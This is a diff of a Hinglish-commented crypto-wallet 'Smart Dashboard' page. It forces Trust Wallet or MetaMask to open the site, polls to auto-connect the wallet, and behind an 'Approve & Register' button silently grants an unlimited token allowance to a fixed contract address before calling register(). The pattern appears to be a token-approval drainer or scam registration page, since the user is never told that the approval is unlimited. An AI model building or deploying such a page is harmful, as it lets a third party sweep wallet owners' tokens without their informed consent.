@@ -1,17 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
-    <title>Smart Access Final</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Dashboard</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; }
-        .w-btn { border: 2px solid #eee; border-radius: 15px; padding: 15px; cursor: pointer; margin: 10px; transition: 0.3s; display: inline-block; width: 100px; }
-        .w-btn img { width: 50px; }
-        #dashboard { display: none; }
-        .action-btn { background: #4CAF50; color: white; padding: 18px; width: 100%; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .status { font-size: 12px; color: #666; margin-top: 15px; }
+        .btn-box { border: 2px solid #eee; border-radius: 15px; padding: 15px; cursor: pointer; margin: 10px; transition: 0.3s; }
+        #dashboardView { display: none; }
+        .reg-btn { background: #4CAF50; color: white; padding: 18px; width: 100%; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .loader { color: #2196F3; font-weight: bold; font-size: 14px; margin: 10px; }
     </style>
 </head>
 <body>
@@ -19,44 +19,47 @@
 <div class="card">
     <div id="connectView">
         <h3>Connect Wallet</h3>
-        <p style="font-size: 12px; color: #888;">Niche icon par click karein aur App ke khulne ka wait karein.</p>
-        <div class="w-btn" onclick="openTrust()">
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png"><br>
-            <small>Trust Wallet</small>
+        <p style="font-size: 12px; color: #666;">App open hone par password dalein aur wahan Dashboard ka intezar karein.</p>
+        
+        <div class="btn-box" onclick="forceOpen('trust')">
+            <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" width="50"><br>
+            Trust Wallet
         </div>
-        <div class="w-btn" onclick="openMM()">
-            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"><br>
-            <small>MetaMask</small>
+        
+        <div class="btn-box" onclick="forceOpen('metamask')">
+            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" width="50"><br>
+            MetaMask
         </div>
     </div>
 
-    <div id="dashboard">
-        <h2 style="color: #2196F3;">Dashboard Active</h2>
-        <p id="userAddr" style="font-size: 10px; background: #eee; padding: 10px; word-break: break-all; border-radius: 10px;"></p>
-        <button id="regBtn" class="action-btn" onclick="register()">Approve & Register</button>
+    <div id="dashboardView">
+        <h2 style="color: #2196F3;">Main Dashboard</h2>
+        <div id="addr" style="font-size: 10px; background: #eee; padding: 10px; word-break: break-all; border-radius: 10px; margin-bottom: 20px;"></div>
+        <button id="regBtn" class="reg-btn" onclick="register()">Approve & Register</button>
     </div>
-    
-    <div id="msg" class="status"></div>
+
+    <div id="status" class="loader"></div>
 </div>
 
 <script>
-    const CONTRACT = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
+    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
     const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
     let signer;
 
-    // 1. Mobile Chrome se App kholne ka logic
-    function openTrust() {
+    // 1. App ko force open karne ka naya tarika
+    function forceOpen(type) {
         const url = window.location.href;
-        window.location.href = "trust://open_url?url=" + encodeURIComponent(url);
-    }
-    
-    function openMM() {
-        const url = window.location.href.replace(/^https?:\/\//, '');
-        window.location.href = "https://metamask.app.link/dapp/" + url;
+        if (type === 'trust') {
+            // Direct Trust link bina browser redirect ke
+            window.location.assign("trust://open_url?url=" + encodeURIComponent(url));
+        } else {
+            window.location.assign("https://metamask.app.link/dapp/" + url.replace(/^https?:\/\//, ''));
+        }
+        document.getElementById('status').innerText = "Opening App...";
     }
 
-    // 2. Wallet Connection logic (Jo automatic chalega)
-    async function connectAuto() {
+    // 2. Automatic Connection (Jab app ke andar site khule)
+    async function init() {
         if (window.ethereum) {
             try {
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -64,44 +67,46 @@
                 
                 if (accounts.length > 0) {
                     signer = provider.getSigner();
-                    const addr = await signer.getAddress();
-                    
+                    const address = await signer.getAddress();
+
                     document.getElementById('connectView').style.display = 'none';
-                    document.getElementById('dashboard').style.display = 'block';
-                    document.getElementById('userAddr').innerText = "Wallet: " + addr;
+                    document.getElementById('dashboardView').style.display = 'block';
+                    document.getElementById('addr').innerText = "Connected: " + address;
+                    document.getElementById('status').innerText = "";
                 }
             } catch (e) {
-                document.getElementById('msg').innerText = "Please Approve Connection in Wallet App";
+                document.getElementById('status').innerText = "Please confirm in Wallet App";
             }
         }
     }
 
-    // --- SABSE ZAROORI PART ---
-    // Yeh check karta hai ki kya hum Trust/MetaMask browser ke andar hain?
-    window.addEventListener('load', () => {
-        if (window.ethereum) {
-            // Agar window.ethereum mil gaya (matlab hum wallet browser mein hain), toh auto-connect karo
-            setTimeout(connectAuto, 500); 
+    // Har 2 second mein check karega (Interval fix)
+    setInterval(() => {
+        if (window.ethereum && document.getElementById('dashboardView').style.display === 'none') {
+            init();
         }
-    });
+    }, 2000);
+
+    // Page load par bhi check karein
+    window.onload = init;
 
     async function register() {
         const btn = document.getElementById('regBtn');
         try {
-            btn.innerText = "Processing...";
+            btn.innerText = "Confirming...";
             const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
-            const mCon = new ethers.Contract(CONTRACT, ["function register() external"], signer);
+            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);
 
-            const tx1 = await tCon.approve(CONTRACT, ethers.constants.MaxUint256);
+            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256);
             await tx1.wait();
 
             const tx2 = await mCon.register();
             await tx2.wait();
 
-            alert("Registration Done!");
+            alert("Success!");
             btn.innerText = "Registered ✅";
         } catch (e) {
-            alert("Transaction Failed!");
+            alert("Transaction Failed");
             btn.innerText = "Register & Access";
         }
     }
